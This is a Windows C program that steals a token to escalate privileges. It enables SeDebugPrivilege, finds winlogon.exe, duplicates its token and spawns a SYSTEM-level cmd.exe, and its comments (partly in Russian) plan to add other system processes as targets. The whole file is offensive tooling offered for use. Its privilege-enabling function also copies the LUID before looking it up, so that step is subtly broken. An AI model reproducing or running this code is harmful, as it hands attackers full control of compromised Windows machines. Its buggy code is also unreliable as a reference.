#include <stdio.h>
#include <windows.h>
#include <tlhelp32.h>

BOOL EnableWindowsPrivilege(WCHAR* Privilege)
{
LUID luid = {0};
TOKEN_PRIVILEGES tp;
HANDLE currentToken,currentProcess = GetCurrentProcess();

tp.PrivilegeCount = 1;
tp.Privileges[0].Luid = luid;
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!LookupPrivilegeValueW(NULL, Privilege, &luid)) return FALSE;
	if (!OpenProcessToken(currentProcess, TOKEN_ALL_ACCESS, &currentToken)) return FALSE;
	if (!AdjustTokenPrivileges(currentToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) return FALSE;
	return TRUE;
}


int GetSystemPid(void)
{
int dwPid = 0; //0
HANDLE hSnapshot = NULL; 
PROCESSENTRY32W p_e;
p_e.dwSize = sizeof(PROCESSENTRY32W);

hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
		{
		wprintf(L"Error CreateToolhelp32Snapshot\n");
        goto E;
 		}

    if (!Process32FirstW(hSnapshot, &p_e)) 
		{
		wprintf(L"Error Process32FirstW\n");
        CloseHandle(hSnapshot);
        goto E;
	    }

    do 
	{
        if(lstrcmpiW(p_e.szExeFile,L"winlogon.exe") == 0) //add wininit,smss and other
			{
			dwPid = p_e.th32ProcessID;
            break;
			}
    } while(Process32NextW(hSnapshot, &p_e));

CloseHandle(hSnapshot);

E:
	return dwPid;
}


BOOL Elevate_0(void)
{
HANDLE hProcess,TokenHandle,phNewToken;
DWORD dwProcessId;
HWND hShellwnd;
BOOL bRet = FALSE;
SECURITY_ATTRIBUTES TokenAttributes = 
	{ 
  	.lpSecurityDescriptor = NULL,
 	.bInheritHandle = FALSE,
	.nLength = sizeof(SECURITY_ATTRIBUTES)
	};

//hShellwnd = GetShellWindow();

//GetWindowThreadProcessId(hShellwnd, &dwProcessId);
dwProcessId = GetSystemPid();//884;
if (dwProcessId == 0)
	{ wprintf(L"Error , can't get valid system pid\n"); return FALSE; }
else
	{ wprintf(L"pid received %d..\n",dwProcessId); }

//XP PROCESS_QUERY_INFORMATION  , на 10 чето не работает
hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, dwProcessId);
	if (hProcess == NULL) //проверку на getlasteror access denied
		{ wprintf(L"Error , can't open process\n"); return FALSE; }
	else
		{ wprintf(L"process opened..\n"); }
             // hObject = hProcess; MAXIMUM_ALLOWED в дхарме было , а так TOKEN_QUERY | TOKEN_IMPERSONATE
bRet = OpenProcessToken(hProcess, MAXIMUM_ALLOWED, &TokenHandle);
	if (bRet == FALSE)
		{ wprintf(L"Error , can't open process token\n"); return FALSE; }
	else
		{ wprintf(L"token getted..\n"); }
bRet = DuplicateTokenEx(TokenHandle,MAXIMUM_ALLOWED,&TokenAttributes,SecurityImpersonation,TokenPrimary,&phNewToken);
	if (bRet == FALSE)
			{ wprintf(L"Error , can't duplicate token\n"); return FALSE; }
	else
			{ wprintf(L"token duplicated..\n"); }

STARTUPINFOW si = {0};
PROCESS_INFORMATION pi = {0};
 
bRet = CreateProcessWithTokenW(phNewToken, LOGON_NETCREDENTIALS_ONLY, L"cmd.exe", NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
//bRet = CreateProcessAsUserW(phNewToken,L"C:\\Windows\\System32\\cmd.exe",NULL,NULL,NULL,FALSE,CREATE_NEW_CONSOLE,NULL,NULL, &si, &pi);
	if (bRet == FALSE) //код выше для ХР, нужны другие привилегии
			{ wprintf(L"Error , can't create process\n"); return FALSE; }
	else
			{ wprintf(L"process created..\n"); }
return TRUE;
}


int wmain(int argc,WCHAR* argv[])
{
wprintf(L"Elevate to system\n");
//check IL < high  - error or runas
EnableWindowsPrivilege(L"SeDebugPrivilege");
Elevate_0();

	return 0;
}
